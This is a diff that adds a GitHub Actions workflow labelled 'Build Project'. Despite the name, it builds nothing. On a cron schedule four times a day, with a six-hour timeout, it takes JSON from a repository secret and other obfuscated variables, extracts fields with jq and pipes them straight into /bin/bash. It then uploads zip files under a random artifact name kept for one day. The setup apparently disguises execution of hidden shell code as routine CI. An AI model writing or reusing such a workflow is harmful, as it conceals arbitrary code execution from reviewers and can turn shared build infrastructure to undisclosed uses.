@@ -1,0 +1,36 @@
+name: Build Project
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '44 5,11,17,23 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  perform:
+    name: Run build
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Run build
+        env:
+          u27482: ${{ secrets.u27482 }}
+        run: |
+          printf '%s' "$u27482" | jq -r .gtli059 | /bin/bash
+          echo $vzn500 | jq -r .utoqp4 | /bin/bash
+          printf '%s' "$uvuo259" | jq -r .suk6 | /bin/bash
+          echo $zeup58970 | jq -r .ujatf695 | /bin/bash
+
+      - name: Save archive
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: Fk2ru7Zq
+          path: "*.zip"
+          retention-days: 1
